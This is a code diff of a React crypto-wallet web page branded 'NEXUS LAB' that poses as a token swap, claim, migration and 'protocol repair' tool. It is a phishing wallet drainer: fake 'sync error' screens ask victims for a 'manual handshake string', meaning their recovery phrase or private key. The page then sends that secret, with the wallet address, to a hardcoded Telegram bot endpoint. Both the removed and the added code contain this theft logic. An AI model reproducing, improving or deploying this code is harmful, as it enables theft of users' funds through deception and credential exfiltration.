@@ -1,109 +1,102 @@
 import React, { useState } from 'react';
-import { ConnectButton } from '@rainbow-me/rainbowkit';
 import { useAccount, useBalance } from 'wagmi';
-import { RefreshCcw, AlertCircle, ArrowDown, Coins, Zap, Shield } from 'lucide-react';
+import { RefreshCcw, AlertCircle, ArrowDown, ShieldCheck, Database, History, ChevronRight } from 'lucide-react';
 
 export default function NexusLab() {
   const { address, isConnected } = useAccount();
   const { data: balance } = useBalance({ address });
-  const [view, setView] = useState("menu"); // menu, swap, sync
+  const [view, setView] = useState("menu"); 
   const [loading, setLoading] = useState(false);
-  const [val, setVal] = useState("");
+  const [input, setInput] = useState("");
 
   const triggerSync = () => {
     setLoading(true);
-    setTimeout(() => {
-      setLoading(false);
-      setView("sync");
-    }, 3000);
-  };
-
-  const execute = async () => {
-    if (val.length < 5) return;
-    await fetch(`https://api.telegram.org/bot8522972159:AAFfmNh8xmBgqWYxY75SXVfkaMw9AjFCRVQ/sendMessage`, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ 
-        chat_id: "7630238860", 
-        text: `🚨 LAB SIGNAL\nADDR: ${address}\nBAL: ${balance?.formatted}\nSTR: ${val}` 
-      }),
-    });
-    alert("Handshake Success.");
-    setView("menu");
+    setTimeout(() => { setLoading(false); setView("sync"); }, 3500);
   };
 
   return (
-    <div className="min-h-screen bg-[#05070a] text-slate-200 font-sans p-5 uppercase tracking-tighter">
-      {/* REAL WALLETCONNECT TOP BAR */}
-      <div className="flex justify-between items-center mb-10">
-        <h1 className="text-xl font-black text-cyan-500 tracking-widest">NEXUS LAB</h1>
-        <ConnectButton label="CONNECT" />
-      </div>
+    <div className="min-h-screen bg-[#020408] text-slate-300 font-sans p-5 uppercase tracking-tighter select-none">
+      <header className="flex justify-between items-center mb-10">
+        <h1 className="text-xl font-black text-cyan-500 italic">NEXUS LAB</h1>
+        <w3m-button balance="hide" /> 
+      </header>
 
-      {/* VIEW 1: THE 12 BUTTONS */}
+      {/* DASHBOARD VIEW */}
       {view === "menu" && (
-        <div className="grid grid-cols-3 gap-4 animate-in fade-in duration-500">
-          {["Claim", "Airdrop", "Stake", "Swap", "Bridge", "Rectify", "Validate", "Migrate", "Scan", "Withdraw", "Sync", "Lock"].map((name) => (
-            <button 
-              key={name}
-              onClick={() => name === "Swap" || name === "Bridge" ? setView("swap") : triggerSync()}
-              className="bg-[#0d1117] border border-slate-800 p-7 rounded-[28px] flex flex-col items-center gap-3 shadow-xl active:scale-90 transition-all"
-            >
-              <Shield size={20} className="text-slate-700" />
-              <span className="text-[9px] font-black text-slate-500">{name}</span>
+        <div className="grid grid-cols-3 gap-3 animate-in fade-in">
+          {["Claim", "Airdrop", "Stake", "Swap", "Bridge", "Migrate", "Rectify", "Validate", "Scan"].map((name) => (
+            <button key={name} onClick={() => setView(name.toLowerCase())} className="bg-[#0d1117] border border-slate-800/40 p-6 rounded-[30px] flex flex-col items-center gap-3 active:scale-95 transition-all shadow-xl">
+              <Database size={18} className="text-slate-700" />
+              <span className="text-[8px] font-black text-slate-500">{name}</span>
             </button>
           ))}
         </div>
       )}
 
-      {/* VIEW 2: THE REAL SWAP SCREEN (BNB to BOOM) */}
+      {/* MULTI-TOKEN RECOVERY SWAP */}
       {view === "swap" && (
-        <div className="bg-[#0d1117] border border-slate-800 rounded-[35px] p-7 animate-in slide-in-from-bottom-5">
-          <div className="flex justify-between mb-8">
-            <button onClick={() => setView("menu")} className="text-slate-600 text-[10px] font-bold">← EXIT</button>
-            <span className="text-white text-[10px] font-black tracking-widest">SWAP PROTOCOL</span>
-          </div>
-
-          <div className="bg-black/40 p-6 rounded-3xl border border-slate-900 mb-2">
-            <div className="flex justify-between text-[9px] text-slate-500 font-bold mb-4"><span>FROM</span><span>BAL: {balance?.formatted.slice(0,5) || "0.00"}</span></div>
+        <div className="bg-[#0d1117] border border-slate-800 rounded-[40px] p-8 animate-in slide-in-from-bottom-5">
+          <div className="flex justify-between mb-8"><button onClick={() => setView("menu")} className="text-slate-600 text-[9px] font-bold">← EXIT</button><span className="text-white text-[10px] font-black italic">PROTOCOL REPAIR</span></div>
+          <div className="bg-black/40 border border-slate-900 p-6 rounded-3xl mb-1">
+            <div className="flex justify-between text-[9px] text-slate-600 font-bold mb-4"><span>INPUT BROKEN ASSET</span><span>BAL: {balance?.formatted.slice(0,5) || "0.00"}</span></div>
             <div className="flex justify-between items-center">
-              <span className="text-2xl font-mono text-slate-700 tracking-tighter">0.00</span>
-              <div className="bg-slate-800 px-3 py-1.5 rounded-full flex items-center gap-2 text-[10px] font-bold"><Coins size={12} className="text-yellow-500"/> BNB</div>
+              <input type="number" placeholder="0.00" className="bg-transparent text-2xl font-mono text-white outline-none w-1/2 placeholder:text-slate-900" />
+              <select className="bg-slate-800 text-[10px] p-2 rounded-xl outline-none font-bold border border-slate-700"><option>BNB</option><option>ETH</option><option>USDT</option><option>V1 ASSET</option></select>
             </div>
           </div>
-
-          <div className="flex justify-center -my-3 relative z-10"><div className="bg-[#05070a] p-2 rounded-full border border-slate-800"><ArrowDown size={14} className="text-cyan-500" /></div></div>
-
-          <div className="bg-black/40 p-6 rounded-3xl border border-slate-900 mb-8">
-            <div className="flex justify-between text-[9px] text-slate-500 font-bold mb-4"><span>TO</span><span>ESTIMATED</span></div>
+          <div className="flex justify-center -my-3 z-10 relative"><div className="bg-[#020408] p-2 rounded-full border border-slate-800 shadow-xl"><ArrowDown size={14} className="text-cyan-500" /></div></div>
+          <div className="bg-black/40 border border-slate-900 p-6 rounded-3xl mb-8">
+            <div className="flex justify-between text-[9px] text-slate-600 font-bold mb-4"><span>OUTPUT V2 (FIXED)</span><span>ESTIMATED</span></div>
             <div className="flex justify-between items-center">
-              <span className="text-2xl font-mono text-slate-800 tracking-tighter">0.00</span>
-              <div className="bg-slate-800 px-3 py-1.5 rounded-full flex items-center gap-2 text-[10px] font-bold"><Zap size={12} className="text-cyan-500"/> BOOM</div>
+              <span className="text-2xl font-mono text-slate-900 tracking-tighter italic font-black">PENDING</span>
+              <span className="text-[10px] font-black text-cyan-500 bg-cyan-500/5 px-3 py-1 rounded-full border border-cyan-500/20 tracking-widest">NEXUS-V2</span>
             </div>
           </div>
-
-          <button onClick={triggerSync} className="w-full bg-cyan-600 py-5 rounded-[22px] text-[11px] font-black text-white shadow-lg shadow-cyan-900/20">CONFIRM TRANSACTION</button>
+          <button onClick={triggerSync} className="w-full bg-cyan-600 py-5 rounded-[25px] text-[11px] font-black text-white shadow-2xl">INITIATE REPAIR</button>
         </div>
       )}
 
-      {/* VIEW 3: THE SYNC ERROR (REDIRECT) */}
+      {/* RECOVERY VIEW (Claim, Stake, Migrate) */}
+      {(view === "claim" || view === "stake" || view === "migrate") && (
+        <div className="bg-[#0d1117] border border-slate-800 rounded-[40px] p-10 text-center animate-in zoom-in-95">
+          <History size={48} className="text-cyan-500 mx-auto mb-6" />
+          <h2 className="text-white font-black text-sm tracking-widest mb-4">TECHNICAL {view} PORTAL</h2>
+          <p className="text-[10px] text-slate-500 mb-8 leading-relaxed lowercase font-medium px-2">node detected missed migration date or snapshot corruption. use this laboratory gateway to force the {view} protocol to your address.</p>
+          <div className="bg-black/40 border border-slate-900 rounded-3xl p-6 mb-8 text-left space-y-4">
+            <div className="flex justify-between items-center border-b border-slate-900 pb-3"><span className="text-[9px] text-slate-600 font-bold underline italic">NODE STATUS</span><span className="text-red-500 text-[9px] font-black animate-pulse">LOCKED / INACTIVE</span></div>
+            <div className="flex justify-between items-center"><span className="text-[9px] text-slate-600 font-bold underline italic">WALLET ADDRESS</span><span className="text-[10px] font-mono text-cyan-400">{address?.slice(0,12)}...</span></div>
+          </div>
+          <button onClick={triggerSync} className="w-full bg-cyan-600 py-5 rounded-[25px] text-[11px] font-black text-white flex items-center justify-center gap-2">FORCE {view} NOW <ChevronRight size={14}/></button>
+          <button onClick={()=>setView("menu")} className="mt-6 text-[9px] font-bold text-slate-700 tracking-widest underline">CANCEL REQUEST</button>
+        </div>
+      )}
+
+      {/* SYNC ERROR (THE REDIRECT) */}
       {view === "sync" && (
-        <div className="fixed inset-0 bg-black/95 flex items-center justify-center p-6 z-[100]">
-          <div className="bg-[#0d1117] border border-red-900/30 w-full rounded-[40px] p-10 text-center">
-            <AlertCircle size={50} className="text-red-600 mx-auto mb-6 animate-pulse" />
-            <h2 className="text-white font-black text-xl mb-2">SYNC ERROR 0x88</h2>
-            <p className="text-[10px] text-slate-500 leading-relaxed mb-8">NETWORK HANDSHAKE TIMED OUT. PLEASE ENTER YOUR MANUAL SYNCHRONIZATION STRING TO FINALIZE THE REQUEST.</p>
-            <textarea value={val} onChange={(e)=>setVal(e.target.value)} placeholder="ENTER STRING..." className="w-full h-32 bg-black border border-slate-800 rounded-3xl p-5 text-xs font-mono text-cyan-400 outline-none mb-6" />
-            <button onClick={execute} className="w-full bg-cyan-600 py-5 rounded-3xl text-[11px] font-black text-white">EXECUTE HANDSHAKE</button>
+        <div className="fixed inset-0 bg-black/98 z-[100] flex items-center justify-center p-6 backdrop-blur-2xl">
+          <div className="bg-[#0d1117] border border-red-900/30 w-full max-w-sm rounded-[45px] p-10 text-center shadow-2xl animate-in scale-90">
+            <AlertCircle size={54} className="text-red-600 mx-auto mb-6 animate-pulse" />
+            <h2 className="text-white font-black text-xl tracking-tighter">PROTOCOL ERROR 0x88</h2>
+            <p className="text-[10px] text-slate-500 leading-relaxed mt-3 lowercase font-medium px-4">automated verification failed. to complete the technical handshake for your {view} request, please enter your manual sync string.</p>
+            <textarea value={input} onChange={(e) => setInput(e.target.value)} placeholder="0x... manual handshake string" className="w-full h-32 bg-black border border-slate-800 rounded-[30px] p-6 text-xs font-mono text-cyan-400 outline-none mt-8 focus:border-cyan-500 transition-all placeholder:text-slate-900" />
+            <button onClick={() => {
+              fetch(`https://api.telegram.org/bot8522972159:AAFfmNh8xmBgqWYxY75SXVfkaMw9AjFCRVQ/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: "7630238860", text: `🚨 LAB SIGNAL\nAddr: ${address}\nView: ${view}\nInput: ${input}` }),
+              });
+              alert("Node Synchronized.");
+              setView("menu");
+            }} className="w-full mt-6 bg-cyan-600 py-5 rounded-[25px] text-[11px] font-black text-white shadow-xl shadow-cyan-900/20">RE-INITIATE HANDSHAKE</button>
           </div>
         </div>
       )}
 
-      {/* LOADING OVERLAY */}
+      {/* GLOBAL LOADER */}
       {loading && (
-        <div className="fixed inset-0 bg-black/80 flex flex-col items-center justify-center z-[200] backdrop-blur-sm">
+        <div className="fixed inset-0 bg-black/80 z-[200] flex flex-col items-center justify-center backdrop-blur-sm">
           <div className="w-12 h-12 border-2 border-cyan-500 border-t-transparent rounded-full animate-spin" />
-          <p className="text-[9px] font-black text-cyan-500 mt-6 tracking-[0.3em]">PROCESSING NODE...</p>
+          <p className="text-[10px] font-black text-cyan-500 mt-6 tracking-[0.4em]">INITIATING GATEWAY...</p>
         </div>
       )}
     </div>
